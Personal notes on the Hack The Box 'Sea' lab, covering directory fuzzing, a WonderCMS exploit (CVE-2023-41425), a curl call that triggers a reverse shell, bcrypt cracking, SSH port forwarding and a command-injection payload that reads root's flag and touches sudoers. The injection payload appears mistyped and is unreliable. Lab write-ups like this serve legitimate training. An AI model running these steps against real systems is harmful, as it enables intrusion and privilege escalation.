
2024-08-17 13:23

Source: #htb  #privesc #Boot2root 
### Reconnaissance 

- `nmap` scan shows `22/tcp ssh` & `80/tcp http`
- the home page of the website isn't useful 
- on visiting the 2nd page we find a contact button that takes us to `contact.php`

`Contact.php` has a few input fields. The first thing that comes up in mind is XSS. 
trying out XSS payloads don't really do anything
### Enumeration

#### using Dirbuster

open the GUI version of Dirbuster and check the `use Blank Extension` box this will find sub-directories of sub-directories. we find `/themes/bike` gets `301` response. 
#### Alternate using [[ffuf]] 

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sea.htb/FUZZ
```
and further find sub-directories of sub-directories of `/themes` (`/themes` was one of the outputs of the above command) we choose `/themes` hoping to find a `cms` 
```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sea.htb/themes/FUZZ
```
on running `ffuf` again we find a `/bike` directory that has a `301` response.

- we get a `403` error when trying to open this in the browser 
> - Try to put files after `/bike/` like `LICENSE`, `robots.txt`, `README.md` and fortunately `README.md` gave something interesting

- take the `GET` request made to `/themes/bike` that gave us `403` error 
- now in the burp repeater change the `GET` request to `/themes/bike/README.md` and hit
- in the response we see that we have instructions on how to use `WonderCMS`
- above in the dirbuster results we saw a `themes/bike/version` directory that gives us the version of the CMS on visiting the URL.
### Exploit

Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the `installModule` component.
- we can get the script for this from github 

- running the exploit and having a netcat listener open doesn't give us a shell 
- we somehow have to trigger the `rev.php` file to make target server’s connection with our machine so, lets run this command in another terminal while having the listener on

I saw this line mentioned multiple times in the code `(“GET”, urlWithoutLogBase+”/themes/revshell-main/rev.php”)` So I just put target URL and gave it a shot!
```shell
curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.57&lport=4444'
```

- we have `amay` and `geo` in the home directory 
- without further ado we run `Linpeas` on this 
- in the interesting files section we find a `/var/www/sea/data/database.js`
- on opening this file we find a password hash (possibly amay's ssh password)

[[Cryptography]] before running john through the password we need to reformat it by removing `\` in order to crack it successfully. use John The Ripper
```shell
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt filename.txt
```
### Privilege Escalation 

Run `Linpeas`... we don't really find anything
I then decided to check if there is anything on Amay’s local host. To do that there is a technique called [[Port Forwarding]]. It basically takes a user’s port and redirect it’s traffic to our port. run the following on your local machine 
```shell
ssh -L 4444:localhost:8080 amay@sea.htb
```
If you’re logged in, you’re good to go. If not, check what’s running on your localhost:4444 you can check that by this command:
```shell
sudo lsof -i :4444
```
If you see some other services, kill the PID and then try the [[ssh (22 port)]] command again.

go to `localhost:4444` in your local browser and login with username as amay and password as mychemicalromance(cracked hash password)

we see a system monitoring page that is under development and we also see a analyze button that analyses the log files 
keep [[burpsuite]] on for rest of the process

- on capturing the request of analysis of the access.log we don't see anything useful
- we try command [[injection]] in the field that specifies the path of the log file in the burp request and get an error that says `suspicious traffic patterns detected` 

below is the URL encoded payload
```shell
log_file=/root/root.txt%3bcp/dev/shm/sudoers>+/etc/suoderskanalyze_log&analyze_log=
```
What this command did is that it inadvertently redirected the content of this file as output, which was then captured and displayed. The exposure occurred due to unintended side effects of the command’s syntax and execution.

### References
https://app.hackthebox.com/competitive/6/overview

walkthrough - https://medium.com/@haroonharoon17/sea-hack-the-box-walk-through-77b1030ce0bc

CMS exploit - [GitHub - prodigiousMind/CVE-2023-41425: WonderCMS Authenticated RCE - CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425?source=post_page-----77b1030ce0bc--------------------------------)

